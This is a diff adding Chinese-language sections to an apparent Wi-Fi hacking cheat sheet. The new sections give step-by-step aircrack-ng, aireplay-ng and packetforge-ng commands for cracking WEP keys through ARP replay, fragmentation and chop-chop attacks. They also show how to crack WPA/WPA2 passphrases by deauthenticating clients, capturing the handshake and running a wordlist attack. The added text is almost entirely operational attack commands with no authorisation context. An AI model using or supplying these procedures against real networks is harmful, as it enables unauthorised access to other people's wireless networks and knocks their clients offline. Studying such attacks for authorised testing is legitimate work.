@@ -135,6 +135,75 @@ airodump-ng -c 3 --bssid <AP_MAC> -w <capture_file> mon0 ## 在指定频道上�
      - 去认证攻击
      - 使用 Aircrack-ng 破解 WEP 密钥
 ```
+### ARP重放攻击（加速IV收集）
+```
+步骤1：开始捕获数据包：
+
+airodump-ng --bssid <BSSID> -c <channel> -w <output file> wlan0mon
+第 2 步：虚假身份验证（如果需要）：
+
+aireplay-ng -1 0 -a <BSSID> -h <your MAC> wlan0mon
+步骤3：ARP重放攻击（注入ARP数据包以增加IV收集）：
+
+aireplay-ng -3 -b <BSSID> -h <your MAC> wlan0mon
+您将看到指示 ARP 数据包正在重放的消息。此攻击会增加捕获的弱 IV 的数量。
+
+步骤 4：破解 WEP 密钥：
+
+aircrack-ng <output file>.cap
+```
+
+### 碎片攻击
+```
+当没有可用的客户端时，碎片攻击很有用，您可以通过碎片数据包来破解 WEP 密钥。
+
+步骤1：开始捕获数据包：
+
+airodump-ng --bssid <BSSID> -c <channel> -w <output file> wlan0mon
+第 2 步：虚假身份验证（如果需要）：
+
+aireplay-ng -1 0 -a <BSSID> -h <your MAC> wlan0mon
+步骤3：执行碎片攻击：
+
+aireplay-ng -5 -b <BSSID> -h <your MAC> wlan0mon
+目标是捕获数据包并将其分段，从而生成密钥流数据。
+
+步骤4：使用Packetforge-ng创建ARP数据包：
+
+一旦您有了可用的密钥流，就可以用来packetforge-ng创建伪造的 ARP 请求：
+packetforge-ng -0 -a <AP MAC> -h <your MAC> -k 255.255.255.255 -l 255.255.255.255 -y <keystream file> -w <arp_packet>
+步骤5：注入ARP数据包：
+
+aireplay-ng -2 -r <arp_packet> wlan0mon
+步骤6：破解WEP密钥：
+
+aircrack-ng <output file>.cap
+```
+
+### Chop-Chop 攻击
+```
+chop-chop 攻击可帮助您解密加密的 WEP 数据包的一个字节并获取密钥流。
+
+步骤1：开始捕获数据包：
+
+airodump-ng --bssid <BSSID> -c <channel> -w <output file> wlan0mon
+第 2 步：执行 Chop-Chop 攻击：
+
+aireplay-ng -4 -b <BSSID> -h <your MAC> wlan0mon
+您将捕获可用于伪造 ARP 数据包或执行解密的数据包的一部分。
+
+步骤3：使用packetforge-ng创建ARP数据包：
+
+使用获取的密钥流创建 ARP 请求：
+packetforge-ng -0 -a <AP MAC> -h <your MAC> -k 255.255.255.255 -l 255.255.255.255 -y <keystream file> -w <arp_packet>
+步骤4：注入ARP数据包：
+
+aireplay-ng -2 -r <arp_packet> wlan0mon
+步骤 5：破解 WEP 密钥：
+
+aircrack-ng <output file>.cap
+```
+
 
 ## WPA/WPA2
 
@@ -153,6 +222,20 @@ airodump-ng -c 3 --bssid <AP_MAC> -w <capture_file> mon0 ## 在指定频道上�
     - 使用 Pyrit
 
 ```
+### 攻击WPA/WPA2（PSK）
+```
+捕获 WPA 握手：
+
+airodump-ng --bssid <BSSID> -c <channel> -w <output file> wlan0mon
+取消对客户端的身份验证以强制重新进行身份验证：
+
+aireplay-ng -0 5 -a <AP MAC> -c <Client MAC> wlan0mon
+使用单词表破解 WPA/WPA2：
+
+aircrack-ng -w <wordlist> <output file>.cap
+推荐词汇表：rockyou.txt
+```
+
 
 
 
